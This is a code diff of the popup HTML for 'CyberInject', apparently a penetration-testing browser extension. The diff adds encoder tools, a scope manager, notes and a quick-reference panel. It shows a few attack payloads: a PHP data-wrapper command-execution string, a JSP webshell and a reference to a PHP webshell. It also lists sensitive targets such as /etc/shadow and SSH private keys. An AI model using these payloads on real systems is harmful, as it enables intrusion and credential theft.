@@ -3,11 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberInject</title>
     <link rel="stylesheet" href="popup.css">
+    <title>CyberInject</title>
+    
 </head>
 <body>
     <div class="extension-container">
+        <div class="scope-status" id="scopeStatus" style="display: none;"></div>
 
         <header class="header">
             <div class="logo-section">
@@ -19,7 +21,7 @@
             </div>
             <div class="header-controls">
                 <button class="settings-button" id="settingsBtn" title="Settings">⚙️</button>
-                <div class="version-badge">v1.2.0</div>
+                <div class="version-badge">v1.3.0</div>
             </div>
         </header>
 
@@ -44,15 +46,27 @@
                 <span class="tab-icon">🔧</span>
                 <span class="tab-text">Other</span>
             </button>
+            <button class="tab-button" data-category="tools">
+                <span class="tab-icon">🛠️</span>
+                <span class="tab-text">Tools</span>
+            </button>
+            <button class="tab-button" data-category="history">
+                <span class="tab-icon">📋</span>
+                <span class="tab-text">History</span>
+            </button>
+            <button class="tab-button" data-category="reference">
+                <span class="tab-icon">📖</span>
+                <span class="tab-text">Ref</span>
+            </button>
         </nav>
 
         <main class="content-area">
-
             <div class="ethics-warning">
                 <span class="warning-icon">⚠️</span>
                 <span class="warning-text">Authorized testing only. Always obtain proper permission.</span>
             </div>
 
+            <!-- XSS Section -->
             <section class="payload-section active" id="xss">
                 <div class="section-header">
                     <h2 class="section-title">Cross-Site Scripting (XSS)</h2>
@@ -197,6 +211,7 @@
                 </div>
             </section>
 
+            <!-- SQLi Section -->
             <section class="payload-section" id="sqli">
                 <div class="section-header">
                     <h2 class="section-title">SQL Injection</h2>
@@ -341,6 +356,7 @@
                 </div>
             </section>
 
+            <!-- SSRF Section -->
             <section class="payload-section" id="ssrf">
                 <div class="section-header">
                     <h2 class="section-title">Server-Side Request Forgery</h2>
@@ -458,6 +474,7 @@
                 </div>
             </section>
 
+            <!-- LFI Section -->
             <section class="payload-section" id="lfi">
                 <div class="section-header">
                     <h2 class="section-title">Local File Inclusion</h2>
@@ -542,7 +559,7 @@
                             <h3 class="payload-name">Data Wrapper</h3>
                             <div class="copy-button">📋</div>
                         </div>
-                        <code class="payload-code">data://text/plain,<?php system($_GET['cmd']); ?></code>
+                        <code class="payload-code">data://text/plain,&lt;?php system($_GET['cmd']); ?&gt;</code>
                         <div class="payload-description">Data wrapper for code execution</div>
                     </div>
 
@@ -575,6 +592,7 @@
                 </div>
             </section>
 
+            <!-- Other Section -->
             <section class="payload-section" id="other">
                 <div class="section-header">
                     <h2 class="section-title">Other Vulnerabilities</h2>
@@ -708,13 +726,217 @@
                         <div class="payload-description">Simple PHP webshell code</div>
                     </div>
 
-                    <div class="payload-card" data-payload="<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>">
+                    <div class="payload-card" data-payload="<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>">
                         <div class="payload-header">
                             <h3 class="payload-name">JSP Webshell</h3>
                             <div class="copy-button">📋</div>
                         </div>
                         <code class="payload-code">&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;</code>
                         <div class="payload-description">JSP webshell command execution</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tools Section -->
+            <section class="payload-section" id="tools">
+                <div class="section-header">
+                    <h2 class="section-title">Encoding & Fuzzing Tools</h2>
+                </div>
+                
+                <div class="tools-grid">
+                    <!-- URL Encoder/Decoder -->
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <h3 class="tool-title">URL Encode/Decode</h3>
+                        </div>
+                        <div class="tool-content">
+                            <input type="text" class="tool-input" id="urlInput" placeholder="Enter text to encode/decode">
+                            <button class="tool-button" id="urlEncode">Encode</button>
+                            <button class="tool-button" id="urlDecode">Decode</button>
+                        </div>
+                        <div class="tool-result" id="urlResult"></div>
+                    </div>
+
+                    <!-- Base64 Encoder/Decoder -->
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <h3 class="tool-title">Base64 Encode/Decode</h3>
+                        </div>
+                        <div class="tool-content">
+                            <input type="text" class="tool-input" id="base64Input" placeholder="Enter text to encode/decode">
+                            <button class="tool-button" id="base64Encode">Encode</button>
+                            <button class="tool-button" id="base64Decode">Decode</button>
+                        </div>
+                        <div class="tool-result" id="base64Result"></div>
+                    </div>
+
+                    <!-- HTML Entity Encoder -->
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <h3 class="tool-title">HTML Entity Encode</h3>
+                        </div>
+                        <div class="tool-content">
+                            <input type="text" class="tool-input" id="htmlInput" placeholder="Enter text to encode">
+                            <button class="tool-button" id="htmlEncode">Encode</button>
+                        </div>
+                        <div class="tool-result" id="htmlResult"></div>
+                    </div>
+
+                    <!-- Hex Encoder/Decoder -->
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <h3 class="tool-title">Hex Encode/Decode</h3>
+                        </div>
+                        <div class="tool-content">
+                            <input type="text" class="tool-input" id="hexInput" placeholder="Enter text to encode/decode">
+                            <button class="tool-button" id="hexEncode">Encode</button>
+                            <button class="tool-button" id="hexDecode">Decode</button>
+                        </div>
+                        <div class="tool-result" id="hexResult"></div>
+                    </div>
+
+                    <!-- Payload Generator -->
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <h3 class="tool-title">Payload Variation Generator</h3>
+                        </div>
+                        <div class="tool-content">
+                            <input type="text" class="tool-input" id="variationInput" placeholder="Enter base payload">
+                            <button class="tool-button" id="generateVariations">Generate</button>
+                        </div>
+                        <div class="tool-result" id="variationResult"></div>
+                    </div>
+
+                    <!-- Character Counter -->
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <h3 class="tool-title">Character Counter</h3>
+                        </div>
+                        <div class="tool-content">
+                            <input type="text" class="tool-input" id="counterInput" placeholder="Enter text to count">
+                            <button class="tool-button" id="countChars">Count</button>
+                        </div>
+                        <div class="tool-result" id="counterResult"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- History Section -->
+            <section class="payload-section" id="history">
+                <div class="section-header">
+                    <h2 class="section-title">Session History</h2>
+                    <button class="tool-button" id="clearHistory">Clear All</button>
+                </div>
+                
+                <div id="historyContainer">
+                    <div class="empty-state">
+                        <div class="empty-state-icon">📋</div>
+                        <div class="empty-state-text">No payloads tested yet. Start testing to see your history here.</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Reference Section -->
+            <section class="payload-section" id="reference">
+                <div class="section-header">
+                    <h2 class="section-title">Quick Reference</h2>
+                </div>
+                
+                <div class="reference-grid">
+                    <div class="reference-card">
+                        <h3 class="reference-title">HTTP Status Codes</h3>
+                        <div class="reference-list">
+                            <code>200</code> OK - Request succeeded<br>
+                            <code>301</code> Moved Permanently<br>
+                            <code>302</code> Found (Temporary Redirect)<br>
+                            <code>400</code> Bad Request<br>
+                            <code>401</code> Unauthorized<br>
+                            <code>403</code> Forbidden<br>
+                            <code>404</code> Not Found<br>
+                            <code>500</code> Internal Server Error<br>
+                            <code>502</code> Bad Gateway<br>
+                            <code>503</code> Service Unavailable
+                        </div>
+                    </div>
+
+                    <div class="reference-card">
+                        <h3 class="reference-title">Common Ports</h3>
+                        <div class="reference-list">
+                            <code>21</code> FTP<br>
+                            <code>22</code> SSH<br>
+                            <code>23</code> Telnet<br>
+                            <code>25</code> SMTP<br>
+                            <code>53</code> DNS<br>
+                            <code>80</code> HTTP<br>
+                            <code>443</code> HTTPS<br>
+                            <code>3306</code> MySQL<br>
+                            <code>5432</code> PostgreSQL<br>
+                            <code>6379</code> Redis<br>
+                            <code>8080</code> HTTP Alternate<br>
+                            <code>27017</code> MongoDB
+                        </div>
+                    </div>
+
+                    <div class="reference-card">
+                        <h3 class="reference-title">OWASP Top 10 (2021)</h3>
+                        <div class="reference-list">
+                            1. Broken Access Control<br>
+                            2. Cryptographic Failures<br>
+                            3. Injection<br>
+                            4. Insecure Design<br>
+                            5. Security Misconfiguration<br>
+                            6. Vulnerable Components<br>
+                            7. Authentication Failures<br>
+                            8. Data Integrity Failures<br>
+                            9. Security Logging Failures<br>
+                            10. Server-Side Request Forgery
+                        </div>
+                    </div>
+
+                    <div class="reference-card">
+                        <h3 class="reference-title">Common Directories</h3>
+                        <div class="reference-list">
+                            <code>/admin</code> Admin panel<br>
+                            <code>/backup</code> Backup files<br>
+                            <code>/config</code> Configuration<br>
+                            <code>/login</code> Login page<br>
+                            <code>/test</code> Test files<br>
+                            <code>/api</code> API endpoints<br>
+                            <code>/uploads</code> Upload directory<br>
+                            <code>/.git</code> Git repository<br>
+                            <code>/phpinfo.php</code> PHP info<br>
+                            <code>/robots.txt</code> Robots file
+                        </div>
+                    </div>
+
+                    <div class="reference-card">
+                        <h3 class="reference-title">Common Parameters</h3>
+                        <div class="reference-list">
+                            <code>?debug=1</code> Debug mode<br>
+                            <code>?admin=true</code> Admin access<br>
+                            <code>?test=1</code> Test mode<br>
+                            <code>?file=</code> File parameter<br>
+                            <code>?page=</code> Page parameter<br>
+                            <code>?id=</code> ID parameter<br>
+                            <code>?url=</code> URL parameter<br>
+                            <code>?redirect=</code> Redirect param<br>
+                            <code>?callback=</code> JSONP callback<br>
+                            <code>?lang=</code> Language param
+                        </div>
+                    </div>
+
+                    <div class="reference-card">
+                        <h3 class="reference-title">Linux Common Files</h3>
+                        <div class="reference-list">
+                            <code>/etc/passwd</code> User accounts<br>
+                            <code>/etc/shadow</code> Password hashes<br>
+                            <code>/etc/hosts</code> Host mappings<br>
+                            <code>/proc/version</code> Kernel info<br>
+                            <code>/var/log/apache2/access.log</code><br>
+                            <code>/home/user/.ssh/id_rsa</code><br>
+                            <code>/root/.bash_history</code><br>
+                            <code>/etc/apache2/apache2.conf</code>
+                        </div>
                     </div>
                 </div>
             </section>
@@ -730,11 +952,11 @@
         </footer>
     </div>
 
-    <!-- Settings Modal -->
-    <div class="settings-modal" id="settingsModal">
-        <div class="settings-content">
-            <div class="settings-header">
-                <h2 class="settings-title">Custom Payloads</h2>
+    <!-- Settings Modal (Custom Payloads) -->
+    <div class="modal" id="settingsModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Custom Payloads</h2>
                 <button class="close-button" id="closeSettings">&times;</button>
             </div>
 
@@ -772,14 +994,87 @@
                 </div>
             </form>
 
-            <div class="custom-payloads-list" id="customPayloadsList">
-                <h3 style="color: #e2e8f0; font-size: 14px; margin-bottom: 12px;">Your Custom Payloads</h3>
-                <div id="customPayloadsContainer"></div>
+            <div style="margin-top: 24px; padding-top: 24px; border-top: 2px solid #334155;">
+                <h3 style="color: #e2e8f0; font-size: 14px; margin-bottom: 12px; font-weight: 600;">Your Custom Payloads</h3>
+                <div id="customPayloadsContainer">
+                    <div class="empty-state">
+                        <div class="empty-state-icon">📦</div>
+                        <div class="empty-state-text">No custom payloads yet. Add one above!</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scope Manager Modal -->
+    <div class="modal" id="scopeModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Scope Manager</h2>
+                <button class="close-button" id="closeScopeModal">&times;</button>
+            </div>
+
+            <form id="scopeForm">
+                <div class="form-group">
+                    <label class="form-label">Domain or IP Address</label>
+                    <input type="text" class="form-input" id="scopeDomain" placeholder="example.com or 192.168.1.1" required>
+                </div>
+
+                <div class="button-group">
+                    <button type="submit" class="btn btn-primary">Add to Scope</button>
+                    <button type="button" class="btn btn-secondary" id="cancelScope">Cancel</button>
+                </div>
+            </form>
+
+            <div style="margin-top: 24px; padding-top: 24px; border-top: 2px solid #334155;">
+                <h3 style="color: #e2e8f0; font-size: 14px; margin-bottom: 12px; font-weight: 600;">In-Scope Targets</h3>
+                <div class="scope-list" id="scopeList">
+                    <div class="empty-state">
+                        <div class="empty-state-icon">🎯</div>
+                        <div class="empty-state-text">No targets in scope. Add one above!</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notes Modal -->
+    <div class="modal" id="notesModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Testing Notes</h2>
+                <button class="close-button" id="closeNotesModal">&times;</button>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Target URL</label>
+                <input type="text" class="form-input" id="notesUrl" placeholder="https://target.com">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Notes</label>
+                <textarea class="form-textarea" id="notesContent" placeholder="Enter your findings and notes..." style="min-height: 200px;"></textarea>
+            </div>
+
+            <div class="button-group">
+                <button type="button" class="btn btn-primary" id="saveNotes">Save Notes</button>
+                <button type="button" class="btn btn-secondary" id="exportNotes">Export</button>
+                <button type="button" class="btn btn-secondary" id="closeNotes">Close</button>
+            </div>
+
+            <div style="margin-top: 24px; padding-top: 24px; border-top: 2px solid #334155;">
+                <h3 style="color: #e2e8f0; font-size: 14px; margin-bottom: 12px; font-weight: 600;">Saved Notes</h3>
+                <div id="savedNotesContainer">
+                    <div class="empty-state">
+                        <div class="empty-state-icon">📝</div>
+                        <div class="empty-state-text">No notes saved yet.</div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
     <script src="popup.js"></script>
-    
+ 
 </body>
 </html>
